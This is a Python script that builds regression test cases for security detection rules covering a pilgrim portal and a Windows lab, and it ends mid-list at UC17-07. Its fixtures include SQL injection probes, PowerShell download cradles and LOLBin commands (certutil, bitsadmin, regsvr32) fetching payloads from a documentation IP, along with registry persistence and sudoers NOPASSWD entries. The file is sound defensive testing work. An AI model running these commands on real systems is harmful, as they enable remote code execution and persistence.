#!/usr/bin/env python3
"""Builds tests/cases/*.json - regression cases for all 25 use cases (UC01-UC25).

Every case is a short sequence of log events and the rule each step must (or must not) produce.
Positive cases prove the detection; negative cases prove the false-positive controls.

Event types
  raw : one log line exactly as the agent sends it (portal JSON log, nginx access log, auditd)
  fim : a syscheck event (only the lab engine can replay these; on the manager, test FIM live)
"""
import json, os

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cases")
PORTAL_LOC = "/var/log/pilgrim-portal/portal.log"
NGINX_LOC = "/var/log/nginx/access.log"
AUDIT_LOC = "/var/log/audit/audit.log"


def portal(event, **f):
    body = {"event": event}
    body.update({k: str(v) for k, v in f.items()})
    line = "Nov 10 20:15:03 web01 pilgrim-portal[812]: " + json.dumps(body, separators=(",", ":"))
    return {"type": "raw", "location": PORTAL_LOC, "log": line}


def nginx(ip, path, status=200, ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"):
    line = f'{ip} - - [10/Nov/2026:20:15:03 +0300] "GET {path} HTTP/1.1" {status} 1532 "-" "{ua}"'
    return {"type": "raw", "location": NGINX_LOC, "log": line}


def nginx_post(ip, path, status=200, ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"):
    line = f'{ip} - - [10/Nov/2026:20:15:03 +0300] "POST {path} HTTP/1.1" {status} 2210 "-" "{ua}"'
    return {"type": "raw", "location": NGINX_LOC, "log": line}


def audit_exec(exe, comm, euid=33, ppid=4110, pid=4123, key="pp_web_exec", serial=5501):
    a = f"msg=audit(1762800000.123:{serial}):"
    line = (f"type=SYSCALL {a} arch=c000003e syscall=59 success=yes exit=0 a0=55d0c1a2b3c0 a1=55d0c1a2b400 "
            f"a2=55d0c1a2b440 a3=0 items=2 ppid={ppid} pid={pid} auid=4294967295 uid={euid} gid={euid} "
            f"euid={euid} suid={euid} fsuid={euid} egid={euid} sgid={euid} fsgid={euid} tty=(none) "
            f'ses=4294967295 comm="{comm}" exe="{exe}" subj=unconfined key="{key}" '
            f'type=EXECVE {a} argc=1 a0="{comm}" type=CWD {a} cwd="/opt/pilgrim-portal/public" '
            f'type=PATH {a} item=0 name="{exe}" inode=1234 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL')
    return {"type": "raw", "location": AUDIT_LOC, "log": line}


def fim(path, change="added", uid="33", user="www-data", diff=None):
    attrs = {"type": "file", "size": 64, "perm": "rw-r--r--", "user_name": user, "group_name": user,
             "uid": uid, "gid": uid, "inode": 4242, "mtime": 1762800000,
             "hash_md5": "0" * 32, "hash_sha1": "0" * 40, "hash_sha256": "0" * 64, "checksum": "0" * 40}
    data = {"path": path, "mode": "realtime", "type": change, "timestamp": 1762800000, "attributes": attrs}
    if change == "modified":
        data["changed_attributes"] = ["size", "mtime", "md5", "sha1", "sha256"]
        data["old_attributes"] = dict(attrs, size=60, mtime=1762790000, hash_md5="1" * 32,
                                      hash_sha1="1" * 40, hash_sha256="1" * 64)
    if diff is not None:
        data["content_changes"] = diff
    return {"type": "fim", "data": data}


AUTH_LOC = "/var/log/auth.log"


def sudo_line(caller, body, iso=False):
    stamp = "2026-11-11T10:00:00.123456+03:00" if iso else "Nov 11 10:00:00"
    return {"type": "raw", "location": AUTH_LOC, "log": f"{stamp} web01 sudo: {caller} : {body}"}


# Windows EventChannel events (replayed by the lab engine; on the manager they are proven live) ----
SYSMON = {"providerName": "Microsoft-Windows-Sysmon", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
          "channel": "Microsoft-Windows-Sysmon/Operational", "level": 4, "computer": "WIN10-LAB"}
SECURITY_OK = {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
               "channel": "Security", "keywords": "0x8020000000000000", "computer": "WIN10-LAB"}
SECURITY_FAIL = dict(SECURITY_OK, keywords="0x8010000000000000")
POWERSHELL = {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}",
              "channel": "Microsoft-Windows-PowerShell/Operational", "level": 5, "computer": "WIN10-LAB"}


def win(system, event_id, **data):
    sysd = dict(system, eventID=event_id)
    return {"type": "win", "system": sysd, "eventdata": {k: str(v) for k, v in data.items()}}


ORIGINAL_NAMES = {"powershell.exe": "PowerShell.EXE", "pwsh.exe": "pwsh.dll", "mshta.exe": "MSHTA.EXE",
                  "wscript.exe": "wscript.exe", "cscript.exe": "cscript.exe", "certutil.exe": "CertUtil.exe",
                  "bitsadmin.exe": "bitsadmin.exe", "regsvr32.exe": "REGSVR32.EXE", "rundll32.exe": "RUNDLL32.EXE",
                  "schtasks.exe": "schtasks.exe", "cmd.exe": "Cmd.Exe", "reg.exe": "reg.exe", "netsh.exe": "netsh.exe",
                  "whoami.exe": "whoami.exe", "net.exe": "net.exe", "net1.exe": "net1.exe", "ipconfig.exe": "ipconfig.exe",
                  "systeminfo.exe": "sysinfo.exe", "nltest.exe": "nltestrk.exe", "vssadmin.exe": "VSSADMIN.EXE",
                  "wevtutil.exe": "wevtutil.exe", "wmic.exe": "wmic.exe", "bcdedit.exe": "bcdedit.exe",
                  "quser.exe": "quser.exe", "tasklist.exe": "tasklist.exe", "arp.exe": "arp.exe", "route.exe": "route.exe"}


def proc(image, cmd, parent=r"C:\Windows\explorer.exe", user=r"WIN10-LAB\ahmed", **extra):
    """A Sysmon event 1 carrying the fields real events have. OriginalFileName matters: Wazuh's
    level-0 classifiers (92025, 92028, 92042) key on it, so fixtures without it would hide real behaviour."""
    base = image.split("\\")[-1].lower()
    fields = dict(RuleName="-", UtcTime="2026-11-11 10:00:00.000", ProcessGuid="{11111111-2222-3333-4444-555555555555}",
                  ProcessId=4242, Image=image, FileVersion="10.0.19041.1", Description="-",
                  Product="Microsoft Windows Operating System", Company="Microsoft Corporation",
                  OriginalFileName=ORIGINAL_NAMES.get(base, base), CommandLine=cmd,
                  CurrentDirectory="C:\\Users\\ahmed\\", User=user, LogonGuid="{11111111-2222-3333-4444-000000000001}",
                  LogonId="0x3e7a1", TerminalSessionId=1, IntegrityLevel="Medium", Hashes="SHA256=" + "0" * 64,
                  ParentProcessGuid="{11111111-2222-3333-4444-555555555554}", ParentProcessId=4100,
                  ParentImage=parent, ParentCommandLine=parent, ParentUser=user)
    fields.update(extra)
    return win(SYSMON, 1, **fields)


def reg(target, details, image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"):
    return win(SYSMON, 13, EventType="SetValue", TargetObject=target, Details=details, Image=image,
               User=r"WIN10-LAB\ahmed")


PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
SYS32 = r"C:\Windows\System32"


def case(cid, title, events, expect=None, forbid=None, kind="positive", local_hour=None):
    c = {"id": cid, "title": title, "kind": kind, "events": events,
         "expect": [{"at": at, "rule": rule} for at, rule in (expect or [])],
         "forbid": forbid or []}
    if local_hour is not None:
        c["local_hour"] = local_hour  # time-dependent rule: lab engine runs it at this local hour
    return c


def login_ok(user, ip, cc, role="pilgrim"):
    return portal("login_success", srcip=ip, username=user, role=role, country=cc, session="s-" + user[-4:])


def login_fail(user, ip, cc, reason):
    return portal("login_failed", srcip=ip, username=user, role="anonymous", country=cc, reason=reason)


cases = {}

# UC01 booking bots ------------------------------------------------------------------------------
cases["uc01"] = [
    case("UC01-01", "One account fires 10 booking attempts in a minute -> 110101",
         [portal("booking_attempt", srcip="203.0.113.20", username="pilgrim0042", role="pilgrim",
                 slot_id=200 + i, result="full") for i in range(10)], expect=[(10, 110101)]),
    case("UC01-02", "15 attempts from one IP, rotating accounts -> 110102",
         [portal("booking_attempt", srcip="203.0.113.21", username=f"pilgrim{i:04d}", role="pilgrim",
                 slot_id=300, result="booked") for i in range(15)], expect=[(15, 110102)], forbid=[110101]),
    case("UC01-03", "9 attempts stays under the threshold (no alert)",
         [portal("booking_attempt", srcip="203.0.113.22", username="pilgrim0043", role="pilgrim",
                 slot_id=200 + i, result="full") for i in range(9)], forbid=[110101, 110102], kind="negative"),
    case("UC01-04", "Load-test agent on the trusted list is ignored",
         [portal("booking_attempt", srcip="198.51.100.20", username="loadtest01", role="pilgrim",
                 slot_id=200 + i, result="full") for i in range(12)], forbid=[110101, 110102], kind="negative"),
]

# UC02 credential attacks ------------------------------------------------------------------------
cases["uc02"] = [
    case("UC02-01", "Wrong passwords for 8 different accounts from one IP -> 110201",
         [login_fail(f"pilgrim{i:04d}", "203.0.113.30", "PK", "bad_password") for i in range(1, 9)],
         expect=[(8, 110201)]),
    case("UC02-02", "5 non-existent accounts from one IP -> 110202 (high confidence)",
         [login_fail(f"user{i}@mail.example", "203.0.113.31", "NG", "unknown_user") for i in range(5)],
         expect=[(5, 110202)]),
    case("UC02-03", "6 wrong passwords for one agency account -> 110203",
         [login_fail("agency.in01", "203.0.113.32", "IN", "bad_password") for _ in range(6)],
         expect=[(6, 110203)]),
    case("UC02-04", "Hotel NAT: 7 pilgrims mistype passwords from one IP (no alert)",
         [login_fail(f"pilgrim{i:04d}", "203.0.113.33", "SA", "bad_password") for i in range(20, 27)],
         forbid=[110201, 110202, 110203], kind="negative"),
    case("UC02-05", "Internal scanner on the trusted list is ignored",
         [login_fail(f"probe{i}", "198.51.100.10", "SA", "unknown_user") for i in range(9)],
         forbid=[110201, 110202], kind="negative"),
    case("UC02-06", "Tuning: nginx 401 for a failed sign-in is absorbed (no duplicate 31101 alert)",
         [nginx_post("192.168.56.130", "/login", 401)], expect=[(1, 110021)], forbid=[31101], kind="negative"),
    case("UC02-07", "Tuning keeps other 4xx: a scanner probing /wp-admin still raises 31101",
         [nginx("203.0.113.80", "/wp-admin/install.php", status=404)], expect=[(1, 31101)], forbid=[110021, 110022]),
]

# UC03 account takeover --------------------------------------------------------------------------
cases["uc03"] = [
    case("UC03-01", "Stuffing from an IP, then a success from that IP -> 110301",
         [login_fail(f"user{i}@mail.example", "203.0.113.40", "NG", "unknown_user") for i in range(5)]
         + [login_ok("pilgrim0007", "203.0.113.40", "NG")], expect=[(5, 110202), (6, 110301)]),
    case("UC03-02", "Password guessing on an account, attacker switches IP, then success -> 110302",
         [login_fail("agency.in01", "203.0.113.41", "IN", "bad_password") for _ in range(6)]
         + [login_ok("agency.in01", "198.18.0.7", "IN", role="agency")], expect=[(6, 110203), (7, 110302)]),
    case("UC03-03", "Unrelated user logs in from another IP after an attack (no takeover alert)",
         [login_fail(f"user{i}@mail.example", "203.0.113.42", "NG", "unknown_user") for i in range(5)]
         + [login_ok("pilgrim0100", "192.0.2.77", "EG")], expect=[(5, 110202)], forbid=[110301, 110302],
         kind="negative"),
]

# UC04 impossible travel -------------------------------------------------------------------------
cases["uc04"] = [
    case("UC04-01", "Same account: Saudi Arabia, then the Netherlands within the hour -> 110401",
         [login_ok("pilgrim0042", "192.168.20.15", "SA"), login_ok("pilgrim0042", "185.107.56.10", "NL")],
         expect=[(2, 110401)]),
    case("UC04-02", "Two logins from the same country (no alert)",
         [login_ok("pilgrim0042", "49.36.10.1", "IN"), login_ok("pilgrim0042", "49.36.99.2", "IN")],
         forbid=[110401], kind="negative"),
    case("UC04-03", "Second login via the corporate VPN exit (allowlisted, no alert)",
         [login_ok("staff.ops01", "192.168.20.30", "SA", role="staff"),
          login_ok("staff.ops01", "198.51.100.50", "NL", role="staff")], forbid=[110401], kind="negative"),
]

# UC05 record harvesting / probing ---------------------------------------------------------------
cases["uc05"] = [
    case("UC05-01", "Staff opens 12 different pilgrim records in minutes -> 110501",
         [portal("record_view", srcip="192.168.20.31", username="staff.ops01", role="staff",
                 pilgrim_id=1000 + i, record_agency="AG-IN01", result="allowed") for i in range(12)],
         expect=[(12, 110501)]),
    case("UC05-02", "Same record re-opened 12 times (no alert)",
         [portal("record_view", srcip="192.168.20.31", username="staff.ops01", role="staff",
                 pilgrim_id=1000, record_agency="AG-IN01", result="allowed") for _ in range(12)],
         forbid=[110501], kind="negative"),
    case("UC05-03", "Approved bulk reviewer during a visa peak (no alert)",
         [portal("record_view", srcip="192.168.20.32", username="staff.visa01", role="staff",
                 pilgrim_id=2000 + i, record_agency="AG-PK01", result="allowed") for i in range(14)],
         forbid=[110501], kind="negative"),
    case("UC05-04", "Pilgrim walks other pilgrims' record IDs and is denied 5 times -> 110502",
         [portal("record_view", srcip="203.0.113.55", username="pilgrim0042", role="pilgrim",
                 pilgrim_id=1043 + i, record_agency="AG-ID01", result="denied") for i in range(5)],
         expect=[(5, 110502)]),
    case("UC05-05", "Tuning: nginx 403 for a refused record is absorbed (no duplicate 31101 alert)",
         [nginx("203.0.113.55", "/records/1100", status=403)], expect=[(1, 110022)], forbid=[31101], kind="negative"),
]

# UC06 SQL injection (detection fixtures only) --------------------------------------------------
taut_enc = "/permits?q=%27%20OR%20%271%27%3D%271"
union_enc = "/permits?q=x%27+UNION+SELECT+NULL%2CNULL--"
time_enc = "/permits?q=1%27+AND+SLEEP%285%29--"
cases["uc06"] = [
    case("UC06-01", "Encoded tautology in the URL -> 110601",
         [nginx("203.0.113.60", taut_enc)], expect=[(1, 110601)]),
    case("UC06-02", "UNION SELECT and time-based probes, 5 in a row from one IP -> 110602",
         [nginx("203.0.113.61", p) for p in [taut_enc, union_enc, time_enc, union_enc, taut_enc]],
         expect=[(1, 110601), (5, 110602)]),
    case("UC06-03", "Injection grammar in the decoded search parameter -> 110603",
         [portal("permit_search", srcip="203.0.113.62", username="-", role="anonymous",
                 q="x' OR 'a'='a", rows=0)], expect=[(1, 110603)]),
    case("UC06-04", "Same request seen by the app and then the edge -> 110604",
         [portal("permit_search", srcip="203.0.113.63", username="-", role="anonymous", q="x' OR 'a'='a", rows=0),
          nginx("203.0.113.63", taut_enc)], expect=[(1, 110603), (2, 110604)]),
    case("UC06-06", "Found live: 5 injection searches seen by app then edge -> burst 110605",
         [e for i in range(5) for e in (
             portal("permit_search", srcip="203.0.113.66", username="-", role="anonymous", q="x' OR 'a'='a", rows=0),
             nginx("203.0.113.66", taut_enc))],
         expect=[(2, 110604), (10, 110605)]),
    case("UC06-05", "Legitimate searches with an apostrophe or the word union (no alert)",
         [portal("permit_search", srcip="203.0.113.64", username="-", role="anonymous", q="Abdullah D'Or", rows=1),
          nginx("203.0.113.64", "/permits?q=Abdullah+D%27Or"),
          portal("permit_search", srcip="203.0.113.64", username="-", role="anonymous", q="Union Travel", rows=2),
          nginx("203.0.113.64", "/permits?q=Union+Travel")],
         forbid=[110601, 110602, 110603, 110604], kind="negative"),
]

# UC07 web-tier compromise -----------------------------------------------------------------------
cases["uc07"] = [
    case("UC07-01", "Script file appears in the portal web root -> 110701",
         [fim("/opt/pilgrim-portal/public/assets/uc07-test.php")], expect=[(1, 110701)]),
    case("UC07-02", "Web service account (www-data) executes a program -> 110702",
         [audit_exec("/usr/bin/id", "id")], expect=[(1, 110702)]),
    case("UC07-03", "Script dropped, then the web tier runs a command -> 110703 (level 15)",
         [fim("/opt/pilgrim-portal/public/assets/uc07-test.php"), audit_exec("/usr/bin/whoami", "whoami", serial=5502)],
         expect=[(1, 110701), (2, 110703)]),
    case("UC07-04", "Static asset (CSS) change in the web root (no alert)",
         [fim("/opt/pilgrim-portal/public/css/site.css", change="modified")], forbid=[110701], kind="negative"),
    case("UC07-05", "Upload allowlist blocks a .php disguised as a passport scan -> 110704",
         [portal("doc_upload", srcip="203.0.113.70", username="pilgrim0042", role="pilgrim",
                 filename="passport.php", ext="php", result="rejected", reason="type_not_allowed")],
         expect=[(1, 110704)]),
    case("UC07-06", "Wrong document type (.docx) rejected - user error, not an attack (no alert)",
         [portal("doc_upload", srcip="203.0.113.71", username="pilgrim0043", role="pilgrim",
                 filename="passport.docx", ext="docx", result="rejected", reason="type_not_allowed")],
         forbid=[110704], kind="negative"),
]

# UC08 price override abuse ----------------------------------------------------------------------
def override(user, pct, pkg="VIP-1448", lp=45000):
    np_ = round(lp * (100 - pct) / 100)
    return portal("price_override", srcip="192.168.20.40", username=user, role="staff", package_id=pkg,
                  list_price=lp, new_price=np_, discount_pct=pct, reason_code="GOODWILL", booking_ref="BK-77812")

cases["uc08"] = [
    case("UC08-01", "Finance approver gives a 35% discount -> 110801",
         [override("fin.approver01", 35)], expect=[(1, 110801)]),
    case("UC08-02", "Non-approver changes a price (10%) -> 110802",
         [override("staff.ops02", 10)], expect=[(1, 110802)]),
    case("UC08-03", "Non-approver gives a 90% discount -> 110803 (level 14)",
         [override("staff.ops02", 90)], expect=[(1, 110803)]),
    case("UC08-04", "Approver makes 4 small overrides in 10 minutes -> 110804",
         [override("fin.approver02", 5) for _ in range(4)], expect=[(4, 110804)]),
    case("UC08-05", "Approver gives a 10% goodwill discount (audit trail only)",
         [override("fin.approver01", 10)], forbid=[110801, 110802, 110803, 110804], kind="negative"),
]

# UC09 bulk export -------------------------------------------------------------------------------
def export(user, role, n, scope):
    return portal("data_export", srcip="192.168.20.45", username=user, role=role, record_count=n,
                  scope=scope, export_format="csv")

cases["uc09"] = [
    case("UC09-01", "Approved reporting account exports 1,500 records in working hours -> 110901",
         [export("staff.reporting", "staff", 1500, "all")], expect=[(1, 110901)], local_hour=11),
    case("UC09-02", "Largest agency exports its own 1,200 pilgrims -> 110902 (not an approved exporter)",
         [export("agency.in01", "agency", 1200, "own")], expect=[(1, 110902)], local_hour=11),
    case("UC09-03", "Approved account exports at 23:00 -> 110903",
         [export("staff.reporting", "staff", 1500, "all")], expect=[(1, 110903)], local_hour=23),
    case("UC09-04", "Non-approved account exports at 02:00 -> 110904 (level 14)",
         [export("staff.ops03", "staff", 1500, "all")], expect=[(1, 110904)], local_hour=2),
    case("UC09-05", "Agency exports its own 300 pilgrims (no alert)",
         [export("agency.pk01", "agency", 300, "own")], forbid=[110901, 110902, 110903, 110904],
         kind="negative", local_hour=11),
]

# UC10 phishing attachments -----------------------------------------------------------------------
cases["uc10"] = [
    case("UC10-01", "mshta opens an HTA from Downloads -> 111001",
         [proc(SYS32 + r"\mshta.exe", r'"C:\Windows\System32\mshta.exe" "C:\Users\ahmed\Downloads\Hajj_visa_update.hta"')],
         expect=[(1, 111001)]),
    case("UC10-02", "wscript runs a .js extracted from a zipped invoice in Temp -> 111002",
         [proc(SYS32 + r"\wscript.exe", r'"C:\Windows\System32\WScript.exe" "C:\Users\ahmed\AppData\Local\Temp\Temp1_invoice.zip\Nusuk_invoice.js"')],
         expect=[(1, 111002)]),
    case("UC10-03", "Word starts PowerShell -> 111003",
         [proc(PS, "powershell.exe -nop -c whoami", parent=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE")],
         expect=[(1, 111003)]),
    case("UC10-04", "IT logon script from the netlogon share (no alert)",
         [proc(SYS32 + r"\wscript.exe", r'"C:\Windows\System32\WScript.exe" \\fileserver\netlogon\map_drives.vbs')],
         forbid=[111001, 111002, 111003], kind="negative"),
    case("UC10-05", "Vendor help file opened with mshta from Program Files (no alert)",
         [proc(SYS32 + r"\mshta.exe", r'"C:\Windows\System32\mshta.exe" "C:\Program Files\Vendor\help\index.hta"')],
         forbid=[111001], kind="negative"),
]

# UC11 PowerShell -----------------------------------------------------------------------------------
B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
cases["uc11"] = [
    case("UC11-01", "Hidden PowerShell with an encoded command -> 111101",
         [proc(PS, f"powershell.exe -nop -w hidden -enc {B64}")], expect=[(1, 111101)]),
    case("UC11-02", "Download cradle on the command line -> 111102",
         [proc(PS, "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a.ps1')\"")],
         expect=[(1, 111102)]),
    case("UC11-03", "Cradle seen in the decoded script block (4104) -> 111103",
         [win(POWERSHELL, 4104, MessageNumber=1, MessageTotal=1, ScriptBlockId="5a1c9d1e-0001",
              ScriptBlockText="$wc = New-Object Net.WebClient; IEX $wc.DownloadString('http://198.51.100.9/a.ps1')", Path="")],
         expect=[(1, 111103)]),
    case("UC11-04", "SCCM agent running an encoded command (excluded by parent, no alert)",
         [proc(PS, f"powershell.exe -NoLogo -NonInteractive -enc {B64}", parent=r"C:\Windows\CCM\CcmExec.exe")],
         forbid=[111101], kind="negative"),
    case("UC11-05", "Admin downloads a report without executing it (no cradle alert)",
         [proc(PS, "powershell.exe -c Invoke-WebRequest -Uri https://intranet.rifadah.lab/report.csv -OutFile C:\\Reports\\r.csv")],
         forbid=[111102], kind="negative"),
]

# UC12 LOLBins ---------------------------------------------------------------------------------------
cases["uc12"] = [
    case("UC12-01", "certutil downloads an EXE (Wazuh 92075 matches first, UC12 child wins) -> 111201",
         [proc(SYS32 + r"\certutil.exe", r"certutil.exe -urlcache -split -f http://198.51.100.9/tool.exe C:\Users\Public\tool.exe")],
         expect=[(1, 111201)]),
    case("UC12-02", "certutil downloads a PowerShell script (gap in Wazuh 92075) -> 111201",
         [proc(SYS32 + r"\certutil.exe", r"certutil -verifyctl -f -split http://198.51.100.9/update.ps1")],
         expect=[(1, 111201)]),
    case("UC12-03", "certutil decodes base64 into an EXE (Wazuh 92018 matches first, UC12 child wins) -> 111202",
         [proc(SYS32 + r"\certutil.exe", r"certutil.exe -decode C:\Users\Public\payload.b64 C:\Users\Public\payload.exe")],
         expect=[(1, 111202)]),
    case("UC12-04", "certutil -decodehex into a DLL (gap in Wazuh 92018) -> 111202",
         [proc(SYS32 + r"\certutil.exe", r"certutil -decodehex C:\Users\ahmed\AppData\Local\Temp\d.hex C:\Users\ahmed\AppData\Local\Temp\d.dll")],
         expect=[(1, 111202)]),
    case("UC12-05", "bitsadmin transfer job -> 111203",
         [proc(SYS32 + r"\bitsadmin.exe", r"bitsadmin.exe /transfer job1 /download /priority high http://198.51.100.9/a.exe C:\Users\Public\a.exe")],
         expect=[(1, 111203)]),
    case("UC12-06", "regsvr32 loads a remote scriptlet -> 111204",
         [proc(SYS32 + r"\regsvr32.exe", r"regsvr32.exe /s /n /u /i:http://198.51.100.9/file.sct scrobj.dll")],
         expect=[(1, 111204)]),
    case("UC12-07", "rundll32 opens a URL -> 111205",
         [proc(SYS32 + r"\rundll32.exe", r"rundll32.exe url.dll,OpenURL http://198.51.100.9/page.hta")],
         expect=[(1, 111205)]),
    case("UC12-08", "certutil copied to Users\\Public under another name -> 111206",
         [proc(r"C:\Users\Public\cu.exe", r"cu.exe -?", OriginalFileName="CertUtil.exe")],
         expect=[(1, 111206)]),
    case("UC12-11", "renamed certutil decodes into an EXE (Wazuh 92016 -> 92017 path) -> 111206",
         [proc(r"C:\Users\Public\cu.exe", r"cu.exe -decode C:\Users\Public\p.b64 C:\Users\Public\p.exe", OriginalFileName="CertUtil.exe")],
         expect=[(1, 111206)]),
    case("UC12-09", "certutil dumping a certificate (no alert)",
         [proc(SYS32 + r"\certutil.exe", r"certutil.exe -dump C:\certs\portal.cer")],
         forbid=[111201, 111202, 111206], kind="negative"),
    case("UC12-10", "admin checks a file hash with certutil (no alert)",
         [proc(SYS32 + r"\certutil.exe", r"certutil -hashfile C:\PilgrimShare\visa-batch.zip SHA256")],
         forbid=[111201, 111202, 111206], kind="negative"),
]

# UC13 registry autoruns -------------------------------------------------------------------------------
RUNKEY = r"HKU\S-1-5-21-1111111111-2222222222-3333333333-1001\Software\Microsoft\Windows\CurrentVersion\Run"
cases["uc13"] = [
    case("UC13-01", "Run key launching an EXE from AppData -> 111302",
         [reg(RUNKEY + r"\Updater", r"C:\Users\ahmed\AppData\Roaming\upd.exe")], expect=[(1, 111302)]),
    case("UC13-02", "Run key written by a normal application in Program Files -> 111301 (medium)",
         [reg(RUNKEY + r"\Zoom", r'"C:\Program Files\Zoom\bin\Zoom.exe" --autostart', image=r"C:\Program Files\Zoom\bin\Zoom.exe")],
         expect=[(1, 111301)]),
    case("UC13-04", "Winlogon Userinit hijacked to also start a file from Users\\Public -> 111302",
         [reg(r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit",
              r"C:\Windows\system32\userinit.exe,C:\Users\Public\svc.exe")], expect=[(1, 111302)]),
    case("UC13-05", "Policies\\Explorer\\Run entry pointing at Program Files -> 111303 (medium)",
         [reg(r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\PilgrimAgent",
              r'"C:\Program Files\Pilgrim\agent.exe"', image=SYS32 + r"\reg.exe")], expect=[(1, 111303)]),
    case("UC13-03", "Installer (msiexec) writes a Run key (no alert)",
         [reg(RUNKEY + r"\VendorAgent", r"C:\Program Files\Vendor\agent.exe", image=SYS32 + r"\msiexec.exe")],
         forbid=[111301, 111302], kind="negative"),
]

# UC14 scheduled tasks -----------------------------------------------------------------------------------
TASK_BAD = ('<?xml version="1.0" encoding="UTF-16"?><Task><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger>'
            '</Triggers><Actions Context="Author"><Exec><Command>C:\\Users\\ahmed\\AppData\\Roaming\\upd.exe</Command>'
            '</Exec></Actions></Task>')
TASK_OK = TASK_BAD.replace("C:\\Users\\ahmed\\AppData\\Roaming\\upd.exe", "C:\\Program Files\\Google\\Update\\GoogleUpdate.exe")
cases["uc14"] = [
    case("UC14-01", "Task 4698 runs an EXE from AppData -> 111401",
         [win(SECURITY_OK, 4698, SubjectUserName="ahmed", SubjectDomainName="WIN10-LAB", TaskName=r"\Updater", TaskContent=TASK_BAD)],
         expect=[(1, 111401)]),
    case("UC14-02", "schtasks /create with a hidden PowerShell action -> 111402",
         [proc(SYS32 + r"\schtasks.exe", r'schtasks.exe /create /sc onlogon /tn Updater /tr "powershell -w hidden -f C:\Users\Public\u.ps1"')],
         expect=[(1, 111402)]),
    case("UC14-03", "Updater task in Program Files (no alert)",
         [win(SECURITY_OK, 4698, SubjectUserName="SYSTEM", SubjectDomainName="NT AUTHORITY", TaskName=r"\GoogleUpdateTaskMachineUA", TaskContent=TASK_OK)],
         forbid=[111401], kind="negative"),
]

# UC15 privileged groups -----------------------------------------------------------------------------------
def group_add(operator, group_sid, group_name, member="S-1-5-21-1111111111-2222222222-3333333333-1009"):
    return win(SECURITY_OK, 4732, SubjectUserName=operator, SubjectDomainName="WIN10-LAB", MemberName="-",
               MemberSid=member, TargetUserName=group_name, TargetDomainName="Builtin", TargetSid=group_sid)

cases["uc15"] = [
    case("UC15-01", "Non-approved operator adds a member to Administrators -> 111501",
         [group_add("ahmed", "S-1-5-32-544", "Administrators")], expect=[(1, 111501)]),
    case("UC15-02", "Approved identity admin adds a member (stays at Wazuh default 60154)",
         [group_add("it.admin", "S-1-5-32-544", "Administrators")], expect=[(1, 60154)], forbid=[111501, 111503],
         kind="negative"),
    case("UC15-03", "Member added to Remote Desktop Users -> 111502",
         [group_add("ahmed", "S-1-5-32-555", "Remote Desktop Users")], expect=[(1, 111502)]),
    case("UC15-04", "Account created then made admin by the same operator -> 111503",
         [win(SECURITY_OK, 4720, SubjectUserName="ahmed", SubjectDomainName="WIN10-LAB", TargetUserName="svc.backup2",
              TargetDomainName="WIN10-LAB", TargetSid="S-1-5-21-1111111111-2222222222-3333333333-1009"),
          group_add("ahmed", "S-1-5-32-544", "Administrators")], expect=[(2, 111503)]),
]

# UC16 expired seasonal accounts ---------------------------------------------------------------------------
def logon_ok(user, ip="192.168.56.1", ltype=2):
    return win(SECURITY_OK, 4624, SubjectUserSid="S-1-5-18", SubjectUserName="WIN10-LAB$", TargetUserName=user,
               TargetDomainName="WIN10-LAB", LogonType=ltype, IpAddress=ip, WorkstationName="WIN10-LAB",
               LogonProcessName="User32", AuthenticationPackageName="Negotiate")

cases["uc16"] = [
    case("UC16-01", "Expired seasonal account logs on -> 111601",
         [logon_ok("s1447.ops017")], expect=[(1, 111601)]),
    case("UC16-02", "Failed logon with an expired seasonal account -> 111602",
         [win(SECURITY_FAIL, 4625, SubjectUserSid="S-1-0-0", TargetUserName="s1447.guide042", TargetDomainName="WIN10-LAB",
              Status="0xc000006d", SubStatus="0xc000006a", LogonType=3, IpAddress="192.168.56.130",
              WorkstationName="ATTACKER", FailureReason="%%2313")],
         expect=[(1, 111602)]),
    case("UC16-03", "Normal staff logon (no alert)", [logon_ok("ahmed")], forbid=[111601], kind="negative"),
]

# UC17 sudo privilege escalation (web01) ------------------------------------------------------------------
cases["uc17"] = [
    case("UC17-01", "/etc/sudoers edited (comment only) -> 111701",
         [fim("/etc/sudoers", "modified", uid="0", user="root", diff="12a13\n> # reviewed by IT 2026-11-11\n")],
         expect=[(1, 111701)]),
    case("UC17-02", "New drop-in file in /etc/sudoers.d -> 111702",
         [fim("/etc/sudoers.d/pp-uc17-test", "added", uid="0", user="root")], expect=[(1, 111702)]),
    case("UC17-03", "Drop-in edited to add a NOPASSWD rule -> 111703",
         [fim("/etc/sudoers.d/pp-uc17-test", "modified", uid="0", user="root",
              diff="1a2\n> nobody ALL=(ALL) NOPASSWD: /usr/bin/true\n")], expect=[(1, 111703)]),
    case("UC17-04", "Full ALL=(ALL:ALL) ALL granted in /etc/sudoers -> 111703",
         [fim("/etc/sudoers", "modified", uid="0", user="root", diff="30a31\n> portal ALL=(ALL:ALL) ALL\n")],
         expect=[(1, 111703)]),
    case("UC17-05", "NOPASSWD only inside a comment stays at 111701 (FP control)",
         [fim("/etc/sudoers", "modified", uid="0", user="root", diff="30a31\n> # portal ALL=(ALL) NOPASSWD: ALL\n")],
         expect=[(1, 111701)], forbid=[111703], kind="negative"),
    case("UC17-06", "Web service account runs sudo (classic syslog time) -> 111704",
         [sudo_line("www-data", "user NOT in sudoers ; TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/true")],
         expect=[(1, 111704)]),
    case("UC17-07", "Web service account runs sudo (Ubuntu 24.04 ISO time) -> 111704",
